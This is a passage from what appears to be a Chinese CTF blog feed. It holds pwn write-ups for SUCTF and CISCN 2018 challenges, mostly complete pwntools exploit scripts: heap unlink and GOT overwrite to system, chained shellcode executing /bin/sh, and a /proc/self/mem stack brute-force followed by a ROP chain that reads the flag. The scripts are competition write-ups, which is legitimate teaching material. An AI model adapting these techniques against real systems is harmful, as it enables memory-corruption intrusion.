class="line">    <span class="keyword">print</span> <span class="string">'func_addr is '</span>, hex(func_flag)</span><br><span class="line">    p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'aaaaaaaaaa'</span>)</span><br><span class="line">    <span class="comment"># p.sendline('a'*offset +  p64(canary) + p64(func_addr))</span></span><br><span class="line">    p.recvuntil(<span class="string">'want?'</span>)</span><br><span class="line">    p.sendline(<span class="string">'b'</span>*<span class="number">0x1A</span> + p64(canary)*<span class="number">2</span> + p64(func_flag)*<span class="number">10</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>):</span><br><span class="line">    pwn(i)</span><br></pre></td></tr></table></figure><h1 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h1><h2 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">free_got=<span class="number">0x602018</span></span><br><span class="line">ptr=<span class="number">0x6020c0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./offbyone'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p= remote(<span class="string">'pwn.suctf.asuri.org'</span>,<span class="number">20004</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'4:edit\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input len\n'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'input your data\n'</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'4:edit\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input id\n'</span>)</span><br><span class="line">p.send(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'4:edit\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input id\n'</span>)</span><br><span class="line">p.send(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'4:edit\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input id\n'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">'input your data\n'</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line">add(<span class="number">136</span>,<span class="string">'hack by 0gur1'</span>.ljust(<span class="number">136</span>,<span class="string">'a'</span>))<span class="comment">#0</span></span><br><span class="line">add(<span class="number">128</span>,<span class="string">'hack by 0gur2'</span>.ljust(<span class="number">128</span>,<span class="string">'b'</span>))<span class="comment">#1</span></span><br><span class="line">add(<span class="number">128</span>,<span class="string">'/bin/sh'</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">128</span>,<span class="string">'/bin/sh'</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">128</span>,<span class="string">'hack by 0gur1'</span>.ljust(<span class="number">128</span>,<span class="string">'d'</span>))<span class="comment">#4</span></span><br><span class="line">add(<span class="number">136</span>,<span class="string">'hack by 0gur1'</span>.ljust(<span class="number">136</span>,<span class="string">'e'</span>))<span class="comment">#5</span></span><br><span class="line">add(<span class="number">128</span>,<span class="string">'hack by 0gur1'</span>.ljust(<span class="number">128</span>,<span class="string">'f'</span>))<span class="comment">#6</span></span><br><span class="line">add(<span class="number">128</span>,<span class="string">'hack by 0gur1'</span>.ljust(<span class="number">128</span>,<span class="string">'g'</span>))<span class="comment">#7</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_chunk = <span class="string">'a'</span>*<span class="number">8</span>+p64(<span class="number">0x81</span>) +p64(ptr+<span class="number">40</span><span class="number">-24</span>)+p64(ptr+<span class="number">40</span><span class="number">-16</span>)</span><br><span class="line">payload= fake_chunk</span><br><span class="line">payload= payload.ljust(<span class="number">0x80</span>,<span class="string">'a'</span>)</span><br><span class="line">payload+=p64(<span class="number">0x80</span>)</span><br><span class="line">payload+=<span class="string">'\x90'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,payload)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">'\x18\x20\x60'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">free_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">sys_addr = free_addr-(libc.symbols[<span class="string">'free'</span>]-libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">log.info(<span class="string">'sys_addr:%#x'</span> %sys_addr)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">2</span>,p64(sys_addr))</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      写论文已经两周了orz，今天终于写完了... SUCTF完全靠大佬们带飞，躺进XCTF联赛决赛圈了..记录一下本队做出的四道PWN题
    
    </summary>
    
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>全国大学生信息安全竞赛（CISCN）解题赛部分PWN题解</title>
    <link href="http://p4nda.top/2018/05/13/ciscn-ctf-2018/"/>
    <id>http://p4nda.top/2018/05/13/ciscn-ctf-2018/</id>
    <published>2018-05-13T06:52:14.000Z</published>
    <updated>2018-07-05T13:29:42.374Z</updated>
    
    <content type="html"><![CDATA[<p>​    拖了好久才来整理全国大学生信息安全竞赛的题解，最近都在忙着DEF CON CHINA的RHG比赛的开发，虽然最后貌似只混了一件T恤… 这次比赛本来不想打的，三、四月份的比赛略多，最后趁着五一的假期，被Misty大佬召唤过来打了一天，队伍名称是Xopowo（俄语好的意思？хорошо）。</p><p><img src="/img/ciscn/0.png" alt=""></p><p>​    最后做出来和复现的有三道：note-service2  、 house_of_grey 、 echo_back</p><h1 id="note-service2"><a href="#note-service2" class="headerlink" title="note-service2"></a>note-service2</h1><p>这道题给出的hint是</p><p><img src="/img/ciscn/1-1.png" alt=""></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>大致分析了一下题目，题目主要提供了add、delete两个函数：</p><p><img src="/img/ciscn/1-2.png" alt="add函数"></p><p><img src="/img/ciscn/1-3.png" alt="delete函数"></p><p>可能很多人发现的是delete函数那里悬垂指针可被double free的漏洞，但是此题这个漏洞貌似并没有太大的用处，此题存在的问题是，<strong>在add函数中输入index时当index是负数或者一个大于预留数组的size可以越界写的问题</strong>。并且，此题对got表没有开启RELRO保护，且也没有开启NX保护，这样可以输入负数，覆写got表函数地址，劫持到我们申请的堆块上去执行。换句话说这题只是一道写shellcode的题目，由于之前刷过pwnable.tw，认出了这题是Alive Note这题，这题在pwnable.tw上是32位的题目，并且限制了仅能输入0~9A~Za~z。貌似CISCN是改成了64位。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>具体思路我曾经写过blog： <a href="http://www.cnblogs.com/p4nda/p/7992951.html（当我发现这题的原型，在国赛期间我心机的隐藏这篇博客，然而可能并没人看...）" target="_blank" rel="noopener">http://www.cnblogs.com/p4nda/p/7992951.html（当我发现这题的原型，在国赛期间我心机的隐藏这篇博客，然而可能并没人看...）</a></p><p>思路是利用malloc申请堆块的规律，虽然只能写很少的shellcode，但是可以利用jmp等跳转语句直接跳转到下一块堆块去执行，最终利用系统调用syscall拿到shell，此题我预先在第一块堆块上部署好了”/bin/sh”，劫持了free@got，此时rdi指向这个/bin/sh节省了不少步骤。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./task_note_service2_OG37AWm'</span>)</span><br><span class="line">context.update(arch = <span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment">#ciscn&#123;93707fa0f2eca125f3998d0c6fb1a932&#125;</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./task_note_service2_OG37AWm'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'117.78.43.123'</span>, <span class="number">31128</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'your choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'index'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">'size'</span>)</span><br><span class="line">p.sendline(str(<span class="number">8</span>))</span><br><span class="line">p.recvuntil(<span class="string">'content'</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line">add((elf.got[<span class="string">'free'</span>]<span class="number">-0x2020A0</span>)/<span class="number">8</span>,asm(<span class="string">'xor rsi,rsi'</span>)+<span class="string">'\x90\x90\xe9\x16'</span>)</span><br><span class="line">add(<span class="number">1</span>,asm(<span class="string">'push 0x3b\n pop rax'</span>)+<span class="string">'\x90\x90\xe9\x16'</span>)</span><br><span class="line">add(<span class="number">2</span>,asm(<span class="string">'xor rdx,rdx'</span>)+<span class="string">'\x90\x90\xe9\x16'</span>)</span><br><span class="line">add(<span class="number">3</span>,asm(<span class="string">'syscall'</span>)+<span class="string">'\x90'</span>*<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'choice'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'index'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="house-of-grey"><a href="#house-of-grey" class="headerlink" title="house_of_grey"></a>house_of_grey</h1><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>此题的逻辑比较复杂，在main函数中首先利用mmap函数分配了一块内存，再利用clone函数，以mmap动态分配的内存作为栈基址，具体启动了fn函数</p><p><img src="/img/ciscn/2-1.png" alt="main"></p><p>在fn函数中首先利用系统沙箱禁止了大部分的系统调用，然后主要提供了4个函数。</p><p><img src="/img/ciscn/2-2.png" alt="功能"></p><p>漏洞存在于case 1中，在设置文件名称是存在溢出漏洞，可以覆盖v8变量，而v8正是case 4中read的第二个参数，因此总体来说存在内存任意写漏洞。</p><p><img src="/img/ciscn/2-3.png" alt="漏洞"></p><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先，可以通过读/proc/self/maps来获取各程序段的内存地址，起初以为这样就可以知道全部的内存地址，包括新启动的进程栈地址。</p><p>但在实际尝试过程中，发现fn函数的栈底并不是mmap得到内存块的结束地址，而是在其内部还有随机化。</p><p>另外还在困惑，在任意写时到底应该写在哪里… w1tcher提示我最终利用exit返回，可以劫持这个流程，但是我头铁决定将case 4中的read参数劫持到read函数的返回地址处，也就是是read自身覆写自身的返回地址… 这样在read函数结束时也就返回到了通过写入的rop中。</p><p>这种想法遇到的一个问题是如何拿到随机化的栈地址？</p><p>此时想到另外一个文件/proc/self/mem，这个文件相当于程序内存的一个映射。在测试过程中发现，其栈起始地址与mmap内存块的结束地址相差了一个随机值，而这个随机值是有一定范围的：0xf000000~0xfffffff之间，是可以爆破的，而爆破的过程是，首先利用case 2的定位函数，预先设定一个读取内存地址的起始值，然后不断的向下读，由于程序栈中存在一个明显的字符串标识”/proc/self/mem”，当读到的数据中包含这个字符串时就可以判断找到了栈。</p><p>可以简单验证一下可行性，爆破的次数最多可以有24次（共可以进行30次操作，其他操作占有次数），24*100000 = 2400000 = 0x249f00 ， 而可能的范围是0x1000000 其概率为0.1430511474609375，是可以接受的。</p><p>另外此题的坑点还有系统调用的限制，最终可以通过open(‘/home/ctf/flag’) read(6,buf,0x100) puts(buf)读出。</p><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./task_house_P4U73bf'</span>)</span><br><span class="line"><span class="comment">#ciscn&#123;57de0cd00899090b7193b2a99508e6db&#125;</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./task_house_P4U73bf'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'117.78.43.123'</span>, <span class="number">32619</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#off = 0x001b0000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Y/n'</span>)</span><br><span class="line">p.sendline(<span class="string">'y'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Exit'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'finding?'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'/proc/self/maps'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Exit'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'get?'</span>)</span><br><span class="line">p.sendline(<span class="string">'10000'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'something:\n'</span>)</span><br><span class="line">pie = int(<span class="string">'0x'</span>+p.recvuntil(<span class="string">'-'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] pie:'</span>,hex(pie)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">a = p.recvline()</span><br><span class="line"><span class="keyword">if</span> <span class="string">'heap'</span> <span class="keyword">in</span> a:</span><br><span class="line">a = p.recvline()</span><br><span class="line">stack_start = int(a.split(<span class="string">'-'</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">stack_end = int((a.split(<span class="string">'-'</span>)[<span class="number">1</span>]).split(<span class="string">' '</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] stack_start:'</span>,hex(stack_start)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] stack_end:'</span>,hex(stack_end)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">a = p.recvline()</span><br><span class="line"><span class="keyword">if</span> <span class="string">'libc'</span> <span class="keyword">in</span> a:</span><br><span class="line">libc.address = int(a.split(<span class="string">'-'</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system:'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">canary = <span class="number">0</span></span><br><span class="line">p.recvuntil(<span class="string">'Exit'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'finding?'</span>)</span><br><span class="line">p.sendline(<span class="string">'/proc/self/mem'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Exit'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'you?'</span>)</span><br><span class="line">stack_guess = <span class="number">0xf800000</span></span><br><span class="line">p.sendline(str(stack_end - stack_guess - <span class="number">24</span>*<span class="number">100000</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] offset from '</span>,hex( stack_guess + <span class="number">24</span>*<span class="number">100000</span>),<span class="string">'to'</span>,hex(stack_guess)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] from '</span>,hex(stack_end - stack_guess - <span class="number">24</span>*<span class="number">100000</span>),<span class="string">'to'</span>,hex(stack_end - stack_guess)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">24</span>):</span><br><span class="line">p.recvuntil(<span class="string">'Exit'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'get?'</span>)</span><br><span class="line">p.sendline(<span class="string">'100000'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'something:\n'</span>)</span><br><span class="line">tmp = p.recvuntil(<span class="string">'1.Find '</span>)[:<span class="number">-7</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="string">'/mem'</span> <span class="keyword">in</span> tmp:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+++] find'</span></span><br><span class="line"><span class="keyword">print</span> tmp.split(<span class="string">'/proc/self/mem'</span>)[<span class="number">0</span>]</span><br><span class="line">canary = u64(tmp.split(<span class="string">'/proc/self/mem'</span>)[<span class="number">0</span>][<span class="number">-0x48</span>:<span class="number">-0x40</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">stack_address = stack_end - stack_guess - <span class="number">24</span>*<span class="number">100000</span> + i *<span class="number">100000</span> + len(tmp.split(<span class="string">'/proc/self/mem'</span>)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> canary==<span class="number">0</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[-] fail'</span></span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] canary :'</span>,hex(canary)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] stack :'</span>,hex(stack_address)</span><br><span class="line">p.recvuntil(<span class="string">'Exit'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'finding?'</span>)</span><br><span class="line">p.sendline(<span class="string">'/proc/self/mem'</span>+<span class="string">'\x00'</span>*(<span class="number">0x18</span><span class="number">-14</span>)+p64(stack_address<span class="number">-56</span>))</span><br><span class="line">p.recvuntil(<span class="string">'Exit'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'content'</span>)</span><br><span class="line">rop =p64(pie+<span class="number">0x0000000000001823</span>)+p64(stack_address<span class="number">-56</span>+<span class="number">0x100</span>)+p64(pie+<span class="number">0x0000000000001821</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pie+elf.symbols[<span class="string">'open'</span>])+p64(pie+<span class="number">0x0000000000001823</span>)+p64(<span class="number">6</span>)+p64(pie+<span class="number">0x0000000000001821</span>)+p64(stack_address<span class="number">-56</span>+<span class="number">0x100</span>)+p64(stack_address<span class="number">-56</span>+<span class="number">0x100</span>)+p64(pie+elf.symbols[<span class="string">'read'</span>])+p64(pie+<span class="number">0x0000000000001823</span>)+p64(stack_address<span class="number">-56</span>+<span class="number">0x100</span>)+p64(pie+elf.symbols[<span class="string">'puts'</span>])</span><br><span class="line">rop +=<span class="string">'a'</span>*(<span class="number">0x100</span>-len(rop))</span><br><span class="line">rop += <span class="string">'/home/ctf/flag\0'</span></span><br><span class="line">p.sendline(rop)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">hex(-0x7fb165afd580 +0x7fb174d53000)  0xf255a80</span></span><br><span class="line"><span class="string">hex(-0x7f810afe4db0 + 0x7f811af62000) 0xff7d250</span></span><br><span class="line"><span class="string">hex(-0x7fe3844beeb0 + 0x7fe394428000) 0xff69150</span></span><br><span class="line"><span class="string">hex(-0x7f73844633a0 + 0x7f73940a9000) 0xfc45c60</span></span><br><span class="line"><span class="string">0x0000000000001823 : pop rdi ; ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x0000000000001821 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    00000000  23 28 99 7f  32 56 00 00  20 2f 20 00  00 00 00 00  │#(··│2V··│ / ·│····│</span></span><br><span class="line"><span class="string">    00000010  00 0b 00 00  00 00 00 00  23 28 99 7f  32 56 00 00  │····│····│#(··│2V··│</span></span><br><span class="line"><span class="string">    00000020  70 2f 20 00  00 00 00 00  00 0b 00 00  00 00 00 00  │p/ ·│····│····│····│</span></span><br><span class="line"><span class="string">    00000030  23 28 99 7f  32 56 00 00  30 2f 20 00  00 00 00 00  │#(··│2V··│0/ ·│····│</span></span><br><span class="line"><span class="string">    00000040  00 0b 00 00  00 00 00 00  0a </span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x49 bytes:</span></span><br><span class="line"><span class="string">    00000000  23 28 99 7f  32 56 00 00  20 2f 20 00  00 00 00 00  │#(··│2V··│ / ·│····│</span></span><br><span class="line"><span class="string">    00000010  00 0b 00 00  00 00 00 00  23 28 99 7f  32 56 00 00  │····│····│#(··│2V··│</span></span><br><span class="line"><span class="string">    00000020  70 2f 20 00  00 00 00 00  00 0b 00 00  00 00 00 00  │p/ ·│····│····│····│</span></span><br><span class="line"><span class="string">    00000030  23 28 99 7f  32 56 00 00  30 2f 20 00  00 00 00 00  │#(··│2V··│0/ ·│····│</span></span><br><span class="line"><span class="string">    00000040  00 0b 00 00  00 00 00 00  0a                        │····│····│·│</span></span><br><span class="line"><span class="string">    00000049</span></span><br><span class="line"><span class="string">[*] Switching to interactive mode</span></span><br><span class="line"><span class="string">: </span></span><br><span class="line"><span class="string">[DEBUG] Received 0x40 bytes:</span></span><br><span class="line"><span class="string">    '/home/ctf/run.sh: line 2:    84 Segmentation fault      ./house\n'</span></span><br><span class="line"><span class="string">/home/ctf/run.sh: line 2:    84 Segmentation fault      ./house</span></span><br><span class="line"><span class="string">[*] Got EOF while reading in interactive</span></span><br><span class="line"><span class="string">$ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h1 id="echo-back"><a href="#echo-back" class="headerlink" title="echo back"></a>echo back</h1><p>此题当时没有做出来就和本科室友出去玩了… 后来回来复现了一下</p><h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" 